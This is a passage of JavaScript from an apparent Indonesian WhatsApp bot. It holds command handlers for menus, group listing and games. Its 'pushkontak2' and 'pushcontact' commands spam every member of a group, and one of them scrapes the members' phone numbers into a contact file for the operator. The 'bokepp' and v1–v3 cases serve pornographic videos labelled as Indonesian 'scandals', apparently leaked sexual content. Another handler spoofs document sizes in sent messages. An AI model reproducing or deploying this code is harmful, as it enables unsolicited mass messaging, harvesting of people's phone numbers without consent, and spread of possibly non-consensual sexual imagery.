            paramsJson: JSON.stringify(listMessage)
        },
        viewOnce: true
    },
];


    // Tambahkan flowActions ke buttonMessage
    buttonMessage.buttons.push(...flowActions);

    // Kirim pesan
    await sych.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
    break;
}


//galang kontol
case 'for': {
    // Hapus pesan sebelumnya jika ada
    if (global.lastMessageId) {
        await sych.deleteMessage(m.chat, { id: global.lastMessageId }); // Menghapus pesan sebelumnya
    }

  let listMessage = {
    text: "Please fill in the form below: \n\n- Name: [Input Field] \n- Email: [Input Field] \n- Feedback: [Input Field]",
    footer: "Fill out the form and submit",
    title: "Form Submission"
};

let sections = [
    {
        title: "Form Fields",
        rows: [
            {
                title: "Enter Your Name",
                description: "Please provide your full name.",
                id: "input_name"
            },
            {
                title: "Enter Your Email",
                description: "Please provide your email address.",
                id: "input_email"
            },
            {
                title: "Enter Your Feedback",
                description: "Please provide your feedback or comments.",
                id: "input_feedback"
            }
        ]
    },
    {
        title: "Form Submission",
        rows: [
            {
                title: "Submit Form",
                description: "Click to submit your filled form.",
                id: "submit_form"
            }
        ]
    }
];

let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                    mentionedJid: [m.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: '120363373320014871@newsletter',
                        newsletterName: 'Powered By Galangxyz',
                        serverMessageId: -1
                    },
                    businessMessageForwardInfo: {
                        businessOwnerJid: sych.decodeJid(sych.user.id)
                    },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                    text: listMessage.text
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: listMessage.footer
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: listMessage.title,
                    subtitle: "",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            display_text: listMessage.text,
                            id: listMessage.id
                        })
                    }]
                })
            })
        }
    }
}, { quoted: fkontak });

// Simpan ID pesan terkirim untuk penghapusan otomatis
global.lastMessageId = msg.key.id; // Simpan ID pesan yang baru saja dikirim

await sych.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
});
    break;
}
			// Menu
			case 'allmenuu': {
			     

// Emoji yang akan digunakan
const reactEmojis = ["⏳", "🕛", "🕒", "🕕", "🕘", "🕛", "✅"];

// Mengirimkan reaksi secara berurutan
for (const emoji of reactEmojis) {
    await sych.sendMessage(m.chat, {
        react: {
            text: emoji,
            key: m.key
        }
    });
}
				sycreply('Menampilkan All Menu...')
				let profile;
				try {
					profile = await sych.profilePictureUrl(m.sender, 'image');
				} catch (e) {
					profile = fake.anonim;
				}
				const menunya = `
■ 「 *${n}USER INFO${n}* 」
${f}*Nama* : ${m.pushName ? m.pushName : 'Tanpa Nama'}
${f}*Id* : @${m.sender.split('@')[0]}
${f}*User* : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
${f}*Limit* : ${isVip ? 'VIP' : db.users[m.sender].limit }
${f}*Uang* : ${db.users[m.sender] ? db.users[m.sender].uang.toLocaleString('id-ID') : '0'}

■ 「 *${n}BOT INFO${n}* 」
${f}*Nama Bot* : ${botname}
${f}*Powered* : @${'0@s.whatsapp.net'.split('@')[0]}
${f}*Owner* : @${owner[0].split('@')[0]}
${f}*Mode* : ${sych.public ? 'Public' : 'Self'}

■ 「 *${n}ABOUT${n}* 」
${f}*Tanggal* : ${tanggal}
${f}*Hari* : ${hari}
${f}*Jam* : ${jam} WIB
‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
╭──❍「 *${n}BOT${n}* 」❍
│${setv} ${prefix}profile
│${setv} ${prefix}claim
│${setv} ${prefix}buy [item] (nominal)
│${setv} ${prefix}transfer
│${setv} ${prefix}leaderboard
│${setv} ${prefix}request (text)
│${setv} ${prefix}react (emoji)
│${setv} ${prefix}tagme
│${setv} ${prefix}runtime
│${setv} ${prefix}totalfitur
│${setv} ${prefix}ping
│${setv} ${prefix}afk
│${setv} ${prefix}rvo (reply pesan viewone)
│${setv} ${prefix}inspect (url gc)
│${setv} ${prefix}addmsg
│${setv} ${prefix}delmsg
│${setv} ${prefix}getmsg
│${setv} ${prefix}listmsg
│${setv} ${prefix}q (reply pesan)
│${setv} ${prefix}menfes (62xxx|fake name)
│${setv} ${prefix}donasi
╰─┬────❍
╭─┴❍「 *${n}GROUP${n}* 」❍
│${setv} ${prefix}add (62xxx)
│${setv} ${prefix}kick (@tag/62xxx)
│${setv} ${prefix}promote (@tag/62xxx)
│${setv} ${prefix}demote (@tag/62xxx)
│${setv} ${prefix}setname (nama baru gc)
│${setv} ${prefix}setdesc (desk)
│${setv} ${prefix}setppgc (reply imgnya)
│${setv} ${prefix}delete (reply pesan)
│${setv} ${prefix}linkgrup
│${setv} ${prefix}analyzechats
│${setv} ${prefix}revoke
│${setv} ${prefix}startsecret (@tag)
│${setv} ${prefix}secretmsg (q)
│${setv} ${prefix}endsecret
│${setv} ${prefix}tagall
│${setv} ${prefix}hidetag
│${setv} ${prefix}totag (reply pesan)
│${setv} ${prefix}listonline
│${setv} ${prefix}grup set
╰─┬────❍
╭─┴❍「 *${n}SEARCH${n}* 」❍
│${setv} ${prefix}spotify (query)
│${setv} ${prefix}ttstalk (query)
│${setv} ${prefix}ytsearch (query)
│${setv} ${prefix}ytsearch2 (q) | (q)
│${setv} ${prefix}pixiv (query)
│${setv} ${prefix}pinterest (query)
│${setv} ${prefix}wallpaper (query)
│${setv} ${prefix}ringtone (query)
│${setv} ${prefix}liriks (lirik/judul)
│${setv} ${prefix}google (query)
│${setv} ${prefix}gimage (query)
│${setv} ${prefix}npm (query)
│${setv} ${prefix}play3 (query)
│${setv} ${prefix}song (query)
│${setv} ${prefix}style (query)
│${setv} ${prefix}cuaca (kota)
│${setv} ${prefix}dukun (nama)
╰─┬────❍
╭─┴❍「 *${n}DOWNLOAD${n}* 」❍
│${setv} ${prefix}spotifydl (url)
│${setv} ${prefix}ytmp3 (url)
│${setv} ${prefix}ttslide (url)
│${setv} ${prefix}play3 (q)
│${setv} ${prefix}instagram (url)
│${setv} ${prefix}tiktok (url)
│${setv} ${prefix}facebook (url)
│${setv} ${prefix}mediafire (url)
│${setv} ${prefix}videymp4 (url)
╰─┬────❍
╭─┴❍「 *${n}QUOTES${n}* 」❍
│${setv} ${prefix}motivasi
│${setv} ${prefix}quotes
│${setv} ${prefix}dare
│${setv} ${prefix}truth
│${setv} ${prefix}renungan
╰─┬────❍
╭─┴❍「 *${n}ISLAMMIC${n}* 」❍
│${setv} ${prefix}quran <1-144>
│${setv} ${prefix}listsurah
│${setv} ${prefix}listdoa
│${setv} ${prefix}doa <1-37>
│${setv} ${prefix}bacaansholat
╰─┬────❍
╭─┴❍「 *${n}TOOLS${n}* 」❍
│${setv} ${prefix}get (url)
│${setv} ${prefix}link2img (url)
│${setv} ${prefix}encode (q)
│${setv} ${prefix}setcmd (reply stc)
│${setv} ${prefix}listcmd
│${setv} ${prefix}delcmd (reply stc)
│${setv} ${prefix}cekcuaca (kota)
│${setv} ${prefix}decode (q encode)
│${setv} ${prefix}hd (reply pesan)
│${setv} ${prefix}brat (txt)
│${setv} ${prefix}toaudio (reply pesan)
│${setv} ${prefix}tomp3 (reply pesan)
│${setv} ${prefix}tovn (reply pesan)
│${setv} ${prefix}toimage (reply pesan)
│${setv} ${prefix}toptv (reply pesan)
│${setv} ${prefix}tourl (reply pesan)
│${setv} ${prefix}getq (reply pesan)
│${setv} ${prefix}tts (textnya)
│${setv} ${prefix}toqr (textnya)
│${setv} ${prefix}ssweb (url)
│${setv} ${prefix}sticker (send/reply img)
│${setv} ${prefix}colong (reply stiker)
│${setv} ${prefix}smeme (send/reply img)
│${setv} ${prefix}emojimix 🙃+💀
│${setv} ${prefix}nulis
│${setv} ${prefix}joko (teksnya)
│${setv} ${prefix}readmore text1|text2
│${setv} ${prefix}qc (pesannya)
│${setv} ${prefix}translate
│${setv} ${prefix}wasted (send/reply img)
│${setv} ${prefix}triggered (send/reply img)
│${setv} ${prefix}shorturl (urlnya)
│${setv} ${prefix}gitclone (urlnya)
│${setv} ${prefix}fat (reply audio)
│${setv} ${prefix}fast (reply audio)
│${setv} ${prefix}bass (reply audio)
│${setv} ${prefix}slow (reply audio)
│${setv} ${prefix}tupai (reply audio)
│${setv} ${prefix}deep (reply audio)
│${setv} ${prefix}robot (reply audio)
│${setv} ${prefix}blown (reply audio)
│${setv} ${prefix}reverse (reply audio)
│${setv} ${prefix}smooth (reply audio)
│${setv} ${prefix}earrape (reply audio)
│${setv} ${prefix}nightcore (reply audio)
│${setv} ${prefix}getexif (reply sticker)
│${setv} ${prefix}sticktele
╰─┬────❍
╭─┴❍「 *${n}AI${n}* 」❍
│${setv} ${prefix}ai (query)
│${setv} ${prefix}gemini (query)
│${setv} ${prefix}luminai (query)
│${setv} ${prefix}meta (query)
│${setv} ${prefix}llama (query)
│${setv} ${prefix}setpromt2 (query)
│${setv} ${prefix}setpromt (query)
│${setv} ${prefix}simi (query)
│${setv} ${prefix}aitukam
│${setv} ${prefix}esia
│${setv} ${prefix}autoai2 (own)
│${setv} ${prefix}autoai (own)
│${setv} ${prefix}txt2img (query)
│${setv} ${prefix}img2text (reply img/stc)
│${setv} ${prefix}aimg (query)
╰─┬────❍
╭─┴❍「 *${n}CEWE${n}* 」❍
│${setv} ${prefix}cjpn 
│${setv} ${prefix}ckorea
│${setv} ${prefix}cthai
│${setv} ${prefix}cindo
│${setv} ${prefix}cviet
│${setv} ${prefix}cchina
╰─┬────❍
╭─┴❍「 *${n}ANIME${n}* 」❍
│${setv} ${prefix}waifu
│${setv} ${prefix}neko
│${setv} ${prefix}bluearchive
╰─┬────❍
╭─┴❍「 *${n}GAME${n}* 」❍
│${setv} ${prefix}tictactoe
│${setv} ${prefix}akinator
│${setv} ${prefix}suit
│${setv} ${prefix}slot
│${setv} ${prefix}math (level)
│${setv} ${prefix}begal
│${setv} ${prefix}casino (nominal)
│${setv} ${prefix}rampok (@tag)
│${setv} ${prefix}tekateki
│${setv} ${prefix}tebaklirik
│${setv} ${prefix}tebakkata
│${setv} ${prefix}tebakbom
│${setv} ${prefix}susunkata
│${setv} ${prefix}tebakkimia
│${setv} ${prefix}caklontong
│${setv} ${prefix}tebaknegara
│${setv} ${prefix}tebakgambar
│${setv} ${prefix}tebakepep
│${setv} ${prefix}tebakbendera
╰─┬────❍
╭─┴❍「 *${n}FUN${n}* 」❍
│${setv} ${prefix}dadu
│${setv} ${prefix}reminder
│${setv} ${prefix}cermin (q)
│${setv} ${prefix}bisakah (text)
│${setv} ${prefix}apakah (text)
│${setv} ${prefix}kapan (text)
│${setv} ${prefix}kerangajaib (text)
│${setv} ${prefix}cekmati (nama lu)
│${setv} ${prefix}ceksifat
│${setv} ${prefix}cekkhodam (nama lu)
│${setv} ${prefix}rate (reply pesan)
│${setv} ${prefix}jodohku
│${setv} ${prefix}jadian
│${setv} ${prefix}fitnah
│${setv} ${prefix}halah (text)
│${setv} ${prefix}hilih (text)
│${setv} ${prefix}huluh (text)
│${setv} ${prefix}heleh (text)
│${setv} ${prefix}holoh (text)
╰─┬────❍
╭─┴❍「 *${n}RANDOM${n}* 」❍
│${setv} ${prefix}coffe
│${setv} ${prefix}kucing
╰─┬────❍
╭─┴❍「 *${n}OWNER${n}* 」❍
│${setv} ${prefix}bot [set]
│${setv} ${prefix}addthumb <nme|lnk>
│${setv} ${prefix}delthumb <nme>
│${setv} ${prefix}listthumb
│${setv} ${prefix}setexif
│${setv} ${prefix}setbio
│${setv} ${prefix}setppbot
│${setv} ${prefix}join
│${setv} ${prefix}typodetect on/off
│${setv} ${prefix}leave
│${setv} ${prefix}block
│${setv} ${prefix}setmenu s<1-9>
│${setv} ${prefix}listblock
│${setv} ${prefix}openblock
│${setv} ${prefix}listpc
│${setv} ${prefix}addcase
│${setv} ${prefix}getcase
│${setv} ${prefix}delcase
│${setv} ${prefix}listgc
│${setv} ${prefix}checklocation
│${setv} ${prefix}creategc
│${setv} ${prefix}addprem
│${setv} ${prefix}delprem
│${setv} ${prefix}listprem
│${setv} ${prefix}addlimit
│${setv} ${prefix}adduang
│${setv} ${prefix}bot --settings
│${setv} ${prefix}bot settings
│${setv} ${prefix}getsession
│${setv} ${prefix}delsession
│${setv} ${prefix}delsampah
│${setv} ${prefix}upsw
│${setv} ${prefix}shutdown
│${setv} ${prefix}restart
│${setv} $
│${setv} >
│${setv} <
╰──────❍`;
				 
    // Mengirim dokumen dengan tombol
    await sych.sendMessage(m.chat, {
        document: fake.docs,
        fileName: ucapanWaktu,
        mimetype: pickRandom(fake.listfakedocs),
        fileLength: '100000000000000',
        pageCount: '999',
        caption: menunya,
        buttons: [
             { buttonId: 'self', buttonText: { displayText: 'Self' }, type: 1 },
        { buttonId: 'public', buttonText: { displayText: 'Public' }, type: 1 }
    ],
        viewOnce: true,
        headerType: 4, // Mengatur header untuk teks/gambar
        contextInfo: {
            mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
            forwardingScore: 10,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: my.ch,
                serverMessageId: null,
                newsletterName: `${botname}${randomEmoji}`
            },
            externalAdReply: {
                title: author,
                body: packname,
                showAdAttribution: true,
                thumbnailUrl: profile,
                mediaType: 1,
                previewType: 0,
                renderLargerThumbnail: true,
                mediaUrl: my.gh,
                sourceUrl: my.gh
            }
        }
    }, {
        quoted: fkontak
    });

    // Debugging tombol sebelumnya
    console.log("Button 1: ");
    console.log(`ButtonId: ${prefix}pushkontak2`);
    console.log(`Button Text: PushKontak2`);
    console.log(`Button Type: 1`);

    console.log("Button 2: ");
    console.log(`ButtonId: ${prefix}list`);
    console.log(`Button Text: List GC`);
    console.log(`Button Type: 1`);

    // Debugging informasi lainnya
    console.log("Sent Message Info: ");
    console.log(`Caption: ${menunya}`);
    console.log(`FileName: ${ucapanWaktu}`);
    console.log(`Mimetype: ${pickRandom(fake.listfakedocs)}`);
    console.log(`FileLength: 100000000000000`);
    console.log(`PageCount: 999`);
    console.log("Context Info: ");
    console.log(`Forwarding Score: 10`);
    console.log(`Is Forwarded: true`);
    console.log(`Newsletter Name: ${botname}${randomEmoji}`);
    console.log(`External Ad URL: ${my.gh}`);

    // Kirim stiker
    await sych.sendMessage(m.chat, {
        sticker: { url: 'src/media/stc.webp' }, // Path stiker
        mimetype: 'image/webp',
    }, {
        quoted: floc
    });

    // Memberikan reaksi emoji
    await sych.sendMessage(m.chat, {
        react: {
            text: randomEmoji, // Emoji acak
            key: m.key // Reaksi ke pesan sebelumnya
        }
    });


    
    


} 
			break;
			
			//list push
			
			
			
			case "list": case "cekid": case"listgrup": {
			     
let gcall = Object.values(await sych.groupFetchAllParticipating().catch(_=> null))
let listgc = `*｢ LIST ALL CHAT GRUP ｣*\n\n`
await gcall.forEach((u, i) => {
listgc += `*• Nama :* ${u.subject}\n*• ID :* ${u.id}\n*• Total Member :* ${u.participants.length} Member\n*• Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n*• Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
sycreply(listgc)
}
break;

case "pushkontak2": {
    if (!isOwner) return sycreply(msg.owner);
    if (!text || !text.includes("|"))
        return sycreply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan|pesan readmore\n\n*Note :* Jeda 1 detik = 1000\nKetik *.listgc* untuk melihat semua list id grup");

    const idnya = text.split("|")[0];
    const delay = Number(text.split("|")[1]);
    let teks = text.split("|").slice(2).join("|");  // Menggabungkan semua bagian teks setelah split dengan "|"

    if (!idnya.endsWith("@g.us")) return sycreply("Format ID Grup Tidak Valid");
    if (isNaN(delay)) return sycreply("Format Delay Tidak Valid");
    if (!teks) return sycreply("Pesan tidak boleh kosong!");

    // Menambahkan karakter invisible untuk readmore
    const readmore = String.fromCharCode(8206).repeat(999); // 999 invisible characters

    // Menambahkan readmore pada setiap bagian teks yang dipisahkan oleh "|"
    let teksWithReadmore = teks.split("|").join(readmore);

    // Inisialisasi variabel contacts
    let contacts = [];

    // Cek metadata grup
    let groupMetadataa;
    try {
        groupMetadataa = await sych.groupMetadata(`${idnya}`);
    } catch (e) {
        return sycreply("*ID Grup* tidak valid!");
    }

    // Ambil peserta grup
    const participants = groupMetadataa.participants;
    const halls = participants.map(v => v.id);

    sycreply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`);

    // Kirim pesan ke setiap anggota grup
    for (let mem of halls) {
        if (mem !== m.sender) {
            contacts.push(mem);
            await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts));
            await sych.sendMessage(mem, { text: teksWithReadmore }, { quoted: fkontak });
            await sleep(Number(delay));
        }
    }

    // Buat file VCF
    try {
        const uniqueContacts = [...new Set(contacts)];
        const vcardContent = uniqueContacts
            .map((contact, index) => {
                const vcard = [
                    "BEGIN:VCARD",
                    "VERSION:3.0",
                    `FN:WA[${index + 1}] ${contact.split("@")[0]}`,
                    `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
                    "END:VCARD",
                    "",
                ].join("\n");
                return vcard;
            })
            .join("");

        fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
    } catch (err) {
        sycreply(err.toString());
    } finally {
        // Kirim file VCF ke pengguna
        if (m.chat !== m.sender)
            await sycreply(`Berhasil Mengirim Pesan Ke *${halls.length}* Member Grup, File Contact Berhasil Dikirim ke Private Chat`);
        await sych.sendMessage(
            m.sender,
            {
                document: fs.readFileSync("./all/database/contacts.vcf"),
                fileName: "contacts.vcf",
                caption: "File Contact Berhasil Di Buat✅",
                mimetype: "text/vcard",
            },
            { quoted: m }
        );
        contacts.splice(0, contacts.length);
        await fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts));
        await fs.writeFileSync("./all/database/contacts.vcf", "");
    }
}
break;
break;


//bokep
case 'bokepp': {
let sections = [{
title: 'Pilihan Bokep buat Pler',
highlight_label: '🔥 Top',
rows: [{
title: 'Skandal indo',
description: `G4k ku4t d1 hut4n d1 g45`, 
id: `v1`
},
{
title: 'Skandal Indo v2', 
description: "5 Video", 
id: `v2`
},
{
title: 'Skandal Indo v3', 
description: "5 Video", 
id: `v3`
}]
}]

let listMessage = {
    title: 'Select Option', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363373320014871@newsletter',
 newsletterName: 'Powered By Galangxyz', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: sych.decodeJid(sych.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: `${n}Selamat Ng0c0k${n}\n\n`   
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `> 18++\n\nDi bawah 18+ tunggu pecah bulu`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Woii @${sender.split("@")[0]}*`,
 subtitle: "",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://Galangxyz.github.io/bkp/15.jpg" } }, { upload: sych.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await sych.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'v1': {
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `${n}Viral Indo 1${n}`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: `> Titile :\n\nG4k ku4t d1 hut4n d1 g45`
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: 'galang',
                        hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: "https://Galangxyz.github.io/bkp/1.mp4" } }, { upload: sych.waUploadToServer }))
 }),
                    
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                              newsletterName: 'Powered By Galangxyz', 
                              newsletterJid:'120363373320014871@newsletter',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: memek });

    await sych.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
case 'v2': {
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `${n}Viral Indo 2${n}`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: `> Titile :\n\nB4p4k k4ndun9`
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: 'galang',
                        hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: "https://Galangxyz.github.io/bkp/2.mp4" } }, { upload: sych.waUploadToServer }))
 }),
                    
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                              newsletterName: 'Powered By Galangxyz', 
                              newsletterJid:'120363373320014871@newsletter',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: memek });

    await sych.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
case 'v3': {
    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `${n}Viral Indo 3${n}`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: `> Titile :\n\ng4ngb4ng`
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: 'galang',
                        hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: "https://Galangxyz.github.io/bkp/3.mp4" } }, { upload: sych.waUploadToServer }))
 }),
                    
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                              newsletterName: 'Powered By Galangxyz', 
                              newsletterJid:'120363373320014871@newsletter',
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, { quoted: memek });

    await sych.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break





		//push
case 'pushcontact': {
     
    if (!isCreator) return sych.sendMessage(m.chat, { text: mess.owner });
    if (!m.isGroup) return sych.sendMessage(m.chat, { text: mess.private });

    const [name, chet] = text.split('/');
    if (!name || !chet) return sych.sendMessage(m.chat, { text: `Contoh: ${prefix + command} nama/pesan` });

    const kontak = {
        displayName: "Contact",
        contacts: [{
            displayName: name,
            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${name};;;\nFN:${name}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        }]
    };

    try {
        const push = await sych.groupMetadata(m.chat);
        if (push.participants.length > 300) return sych.sendMessage(m.chat, { text: 'Batas member maksimal: *300*' });

        await sych.sendMessage(m.chat, { text: mess.wait });
        for (let a of push.participants) {
            const repf = await sych.sendMessage(a.id, { contacts: kontak });
            await sych.sendMessage(a.id, { text: chet }, { quoted: repf });
            await sleep(1000);
        }
        await sych.sendMessage(m.chat, { text: mess.done });
    } catch (err) {
        console.error(err);
        sych.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mengirim kontak.' });
    }
}
break;

case 'getcontact': case 'getcon': {
     
    if (!m.isGroup) return sych.sendMessage(m.chat, { text: mess.group });
    if (!(m.isAdmin || isCreator)) return sych.sendMessage(m.chat, { text: mess.owner });

    try {
        const groupMetadata = await sych.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        const groupInfo = `Succesful\n> Grup: *${groupMetadata.subject}*\n> Anggota: *${participants.length}*`;
        await sych.sendMessage(m.chat, { text: groupInfo }, { quoted: fkontak, ephemeralExpiration: 86400 });
        await sleep(1000);

        // Menyusun array kontak yang sesuai dengan format yang diterima oleh API
        const kontak = participants.map(a => ({
            displayName: a.id.split('@')[0], // Nama kontak diambil dari ID
